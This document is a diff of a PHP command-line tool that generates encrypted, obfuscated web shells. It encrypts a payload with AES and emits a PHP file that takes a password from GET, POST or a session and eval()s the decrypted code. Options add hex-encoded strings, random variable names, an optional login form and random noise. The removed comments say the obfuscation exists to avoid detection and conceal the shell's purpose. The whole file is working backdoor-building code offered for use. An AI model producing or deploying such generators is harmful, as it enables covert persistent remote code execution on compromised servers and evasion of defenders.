@@ -1,56 +1,79 @@
+#!/usr/bin/env php
+
 <?php
-    if ($argc < 4)
+    $options = getopt("hsfp:n:k:i::c::m:ro:");
+    if (isset($options['h']) || empty($options))
     {
-        echo "Usage: create.php <payload_file> <password> <output_file>\n";
+        echo "Usage: $argv[0] [options] -p <payload> -k <password> -o <output>\n\n";
+        echo "Options:\n" .
+             "   -h              Display this help message and exit\n" .
+             "   -s              Save the password to a session cookie\n" .
+             "   -f              Add a login form to access the web shell\n" .
+             "   -p <payload>    The file containing the payload\n" .
+             "   -n <field>      The name of the password field\n" .
+             "   -k <password>   The password to encrypt the payload\n" .
+             "   -i <passfile>   Read the password from file\n" .
+             "   -c <cipher>     The cipher algorithm and mode of operation as\n" .
+             "                   identified by openssl (example: AES-256-CTR)\n" .
+             "   -m POST|GET     The method used to get the password\n" .
+             "   -r              Fill the end of the code with random noise\n" .
+             "   -o <output>     Save the web shell as <output_file>\n\n";
         exit;
     }
-    echo "Encrypted WebShell generator by LvMalware\n\n";
-    echo "[+] Opening payload file... ";
-    $file = @fopen($argv[1], "r");
-    if (!$file)
-        die("[!]\n" . $argv[0] .": Can't open '" . $argv[1] . "' for reading\n");
-    echo "[OK]\n[+] Reading payload data... ";
-    $payload = fread($file, filesize($argv[1]));
-    fclose($file);
-    echo "[OK]\n[+] Encrypting payload... ";
-    $iv = random_bytes(16);
-    /* The payload will be encrypted with AES-256 in CTR mode using the
-    openssl_encrypt() function from the OpenSSL extension for PHP >= 5.3.0.
-    Older PHP versions could require the use of some other cryptography
-    extensions, or even the use of some personalized encryption algorithm.
-    */
-    $encrypted = openssl_encrypt($payload, "AES-256-CTR", $argv[2], 0, $iv);
-    echo "[OK]\n[+] Generating file... ";
-    if ($encrypted)
-    {
-        $iv = base64_encode($iv);
-        $var_payload = "_" . bin2hex(random_bytes(11));
-        $var_password = "_" . bin2hex(random_bytes(11));
-        /*
-            Modify the output code if you need it to be more difficult to
-         understand (that is, to avoid detection). Note that once a password is
-         entered, it will be saved into a session cookie and used to decrypt the
-         payload that will then be executed next. This will happen even if the
-         password is incorrect, so with the wrong password the user will see
-         a lot of errors or just won't see anything as output, thus keeping the
-         real purpose of the webshell concealed.
-            On the other hand, this method of maintaining access could be used
-         to detect the file and even to obtain the password. As an alternative,
-         you could remove this part of the code and compensate it with other 
-         method coded on the payload to mantain the access after typing the
-         correct password the first time.
-            Also, the form displayed to enter a password can be removed, so a
-         user that only has access to the client-side on the server would not
-         be able to spot this as a malicious (even though suspicious) file.
-          */
-        $outcode = "<?php session_start();\$$var_payload=\"$encrypted\";if(!empty(\$$var_password=\$_POST['$var_password']))\$_SESSION['$var_password']=\$$var_password;if(isset(\$_SESSION['$var_password'])){eval(openssl_decrypt(\$$var_payload,\"\\x41\\x45\\x53\\x2d\\x32\\x35\\x36\\x2d\\x43\\x54\\x52\",\$_SESSION['$var_password'],0,base64_decode(\"$iv\")));}else{echo\"\\x3c\\x66\\x6f\\x72\\x6d\\x20\\x6d\\x65\\x74\\x68\\x6f\\x64\\x3d\\x22\\x50\\x4f\\x53\\x54\\x22\\x3e\\x3c\\x69\\x6e\\x70\\x75\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x22\\x20\\x6e\\x61\\x6d\\x65\\x3d\\x22$var_password\\x22\\x3e\\x3c\\x69\\x6e\\x70\\x75\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x73\\x75\\x62\\x6d\\x69\\x74\\x22\\x20\\x76\\x61\\x6c\\x75\\x65\\x3d\\x22\\x45\\x6e\\x74\\x65\\x72\\x22\\x3e\\x3c\\x2f\\x66\\x6f\\x72\\x6d\\x3e\";}?>";
-        $file = fopen($argv[3], "w");
-        fwrite($file, $outcode);
-        fclose($file);
-        echo "[OK]\n[+] File was saved as '" . $argv[3] . "'\n";
-    }
+    if (isset($options['k']))
+        $password = $options['k'];
+    elseif (isset($options['i']))
+        $password = @fread(fopen($options['i'], 'r'), filesize($options['i']));
     else
+        $password = readline("Password: ");
+    if (!isset($password) || empty($password))
+       die("$argv[0]: You must provide a password!\n");
+    if (isset($options['p']))
+       $payload = @fread(fopen($options['p'],'r'),filesize($options['p']));
+    if (!isset($payload) || empty($payload))
+        die("$argv[0]: Invalid payload!\n");
+    $cipher = isset($options['c']) ? $options['c'] : "AES-256-CTR";
+    if (!isset($options['o']))
+        die("$argv[0]: You must provide a name to the output file!\n");
+    $method = isset($options['m']) ? strtoupper ($options['m']) : "GET";
+    echo "[+] The webshell will receive the password using $method\n";
+    function hex_encode($str)
     {
-        die("[!]\n" . $argv[0] . ": Error while generating file\n");
+        return '\x' . implode('\x', array_map('bin2hex', str_split($str)));
     }
+    $iv = random_bytes(16);
+    $pass_field = isset($options['n']) ? $options['n'] :
+                  "_" . bin2hex(random_bytes(random_int(5, 60)));
+    echo "[+] The password field has the name '$pass_field'\n";
+    $payload_var = "_" . bin2hex(random_bytes(random_int(5,60)));
+    $encrypted = openssl_encrypt($payload, $cipher, $password, 0, $iv);
+    $iv = bin2hex($iv);
+    echo "[+] Payload encrypted with IV: $iv\n";
+    $output_code = "<?php \$$payload_var=\"$encrypted\";" .
+    (isset($options['s']) ? "session_start();" : "") . "if(!empty(" .
+    "\$$pass_field=\$_${method}['$pass_field']))";
+    $cipher = hex_encode($cipher);
+    if (isset($options['s']))
+        $output_code .= "\$_SESSION['$pass_field']=\$$pass_field;if(isset(" .
+        "\$_SESSION['$pass_field']))";
+    $output_code .= "eval(openssl_decrypt(\$$payload_var,\"$cipher\"," .
+                    (isset($options['s']) ? "\$_SESSION['$pass_field']" :
+                    "\$$pass_field") . ",0,hex2bin(\"$iv\")));";
+    if (isset($options['f']))
+        $output_code .= "else echo\"" . hex_encode(
+            "<form method=\"$method\">\n" .
+            "    <input name=\"$pass_field\" type=\"password\">\n" .
+            "    <input type=\"submit\" value=\"Go\">\n" .
+            "</form>\n"
+        ) . "\";";
+    if (isset($options['r']))
+        $output_code .= "\$$payload_var=\"" .
+            base64_encode(random_bytes(random_int(128,512))) ."\";";
+    $output_code .= " ?>";
+    $out_file = @fopen($options['o'], "w");
+    if (!isset($out_file))
+        die("$argv[0]: Can't open " . $options['o'] . " to write\n");
+    fwrite($out_file, $output_code);
+    fclose($out_file);
+    echo "[+] File was saved as " . $options['o'] . "\n";
 ?>
